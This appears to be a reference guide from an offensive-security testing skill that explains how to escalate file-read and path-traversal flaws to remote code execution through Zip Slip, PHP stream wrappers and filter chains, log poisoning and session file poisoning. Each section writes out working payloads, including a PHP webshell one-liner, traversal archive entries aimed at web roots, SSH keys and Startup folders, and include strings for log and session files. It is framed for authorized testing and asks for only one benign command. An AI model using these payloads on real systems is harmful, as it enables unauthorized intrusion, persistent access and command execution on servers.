# Escalation to RCE

A confirmed file read is real and reportable on its own, but the same root cause frequently escalates further. Work through these once basic traversal/LFI is confirmed.

## Zip Slip (archive-extraction path traversal)

**The mechanism:** when an application extracts an uploaded archive (zip, tar, jar, war, cpio, apk, rar, 7z all support this), it normally builds each extracted file's destination as `targetDirectory + entryName`. If the extraction code doesn't validate that each entry name stays within the target directory, an attacker-crafted archive containing an entry literally named `../../var/www/html/shell.php` gets written wherever that traversal resolves to — not inside the intended extraction folder.

```
1. Create a file with your payload content:
   echo '<?php system($_GET["cmd"]); ?>' > shell.php
2. Package it into an archive with a path-traversal entry name
   (the exact tooling varies by format/language, but conceptually):
   zip evil.zip ../../../../../var/www/html/shell.php
3. Upload the archive through the application's normal
   import/restore/extract feature.
4. Confirm the file landed at the traversed destination — by
   requesting it directly (if it's web-accessible) or via the
   original LFI/read primitive, before concluding the write
   succeeded.
```

High-value destinations once write capability is confirmed:
```
- A web-accessible directory, for a directly-executable webshell
  (.php/.jsp/.asp depending on stack)
- ~/.ssh/authorized_keys, for persistent SSH access (describe this
  capability in your report rather than actually adding a key)
- A Windows Startup folder, for execution on next reboot/login
- An existing application file (overwrite), if you want to
  demonstrate integrity impact rather than new-file RCE
```

Zip Slip isn't only a years-old issue — path-validation bypass during archive extraction (including via Windows Alternate Data Streams, distinct from the literal `../` mechanism above) has been the root cause of recently disclosed, actively-exploited RCE vulnerabilities in mainstream archive tools, so don't assume a modern, well-known archive library is automatically safe — confirm the specific version's extraction behavior directly.

**Confirming, not just observing:** the archive must be accepted and extracted by the application (not just that you successfully built a malicious zip), and you must confirm the file actually exists at the traversed path afterward — a successful upload response alone doesn't prove the extraction code lacked validation.

## PHP stream wrappers

If the LFI sink is `include()`/`require()` (executes the included file as PHP) rather than a simple read-and-display, you have a fundamentally more powerful primitive than basic file disclosure — PHP's wrapper system gives you several ways to manipulate what gets "included."

**Source disclosure even when direct read shows nothing** (because PHP source executes instead of displaying when included directly) — base64-encode it first so it returns as harmless text:
```
php://filter/convert.base64-encode/resource=index.php
```
Decode the result locally to recover the real source.

**`php://input` — execute POSTed data directly**, if `allow_url_include` is enabled and the sink is reachable with attacker-controlled POST body content:
```
GET  /index.php?page=php://input
POST <?php system($_GET['cmd']); ?>
```

**PHP filter chains — RCE from a read-only-looking LFI, no file write or upload needed.** A documented technique (popularized by Synacktiv's research and automated by the public `php_filter_chain_generator` tool) abuses PHP's `convert.iconv.*` and `convert.base64-*` filters chained together to progressively transform an attacker-controlled string into arbitrary PHP code, purely through the filter pipeline — with no second file, no upload, and no `allow_url_include` requirement. This is a real, current escalation path for any `php://filter`-reachable LFI; if a target blocks file uploads and `allow_url_include` is off, this is the next thing to try rather than concluding the LFI is read-only. Use the public tool to generate the chain for a chosen payload rather than constructing it by hand.

**`zip://` — extract and include from an uploaded archive**, if any upload feature exists elsewhere in the application (even one with no relation to the LFI sink):
```
1. Upload a .zip file (via any feature that accepts file uploads)
   containing a PHP webshell, e.g. shell.php inside the archive.
2. Reference it through the LFI sink:
   page=zip://var/www/uploads/yourfile.zip%23shell.php
   (%23 is a URL-encoded # — the fragment separates the archive path
   from the internal entry name)
```

## Log poisoning

If the application logs request data verbatim (access logs, mail logs, application logs) and the LFI sink can include arbitrary readable files, you can plant PHP code in a log entry and then include that same log file to execute it.

```
1. Locate a log file the web server user can read and that logs
   attacker-influenced request data (Apache/nginx access logs log
   the User-Agent and request line by default; mail logs record
   message headers if the app sends mail).
2. Send a request with a PHP payload in a logged field, e.g. the
   User-Agent header:
   User-Agent: <?php system($_GET['cmd']); ?>
3. Include the log file via the LFI sink, with your command in the
   query string:
   page=../../../../var/log/apache2/access.log&cmd=id
4. The server parses the log line as PHP at include-time, executing
   your command and (depending on how the page renders) reflecting
   its output.
```
Common log locations to try: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/var/log/mail.log`. Exact paths vary by distro and web server — check a confirmed-readable file first (e.g. `/etc/passwd`) to validate the LFI primitive, then pivot to locating the actual log path (sometimes disclosed via a misconfigured error page, or guessable from the OS/stack you've already fingerprinted).

## Session file poisoning

Similar concept, using the PHP session file instead of a web server log: if you can control any value that gets stored in your own session (a profile field, a search term, a "remember me" preference) and the LFI sink can read PHP's session storage path, write PHP code into a session value, then include your own session file.

```
1. Identify PHP's session save path (commonly /var/lib/php/sessions/sess_<id>
   or /tmp/sess_<id> — your own session ID is in your session cookie).
2. Store a payload in a session-backed field:
   POST /profile {"bio": "<?php system($_GET['cmd']); ?>"}
3. Include your own session file via the LFI sink:
   page=../../../../var/lib/php/sessions/sess_<your_session_id>&cmd=id
```
This works specifically because it's *your own* session — no race condition or guessing another user's session ID is required, unlike log poisoning where you're relying on your request being the most recent (or only) line containing your payload.

## What makes an escalation-to-RCE finding confirmed, not theoretical

Actual command output returned through the full chain — the poisoned log/session file actually included and actually executing, or the Zip Slip-written file actually present at the traversed path and (if claiming RCE specifically) actually invoked successfully. Each technique above has a "this should theoretically work" version and a "I did it once, end to end, and have the output to show" version — only the second is a finding. Stop at one benign command's output; see the core principle in `SKILL.md`.
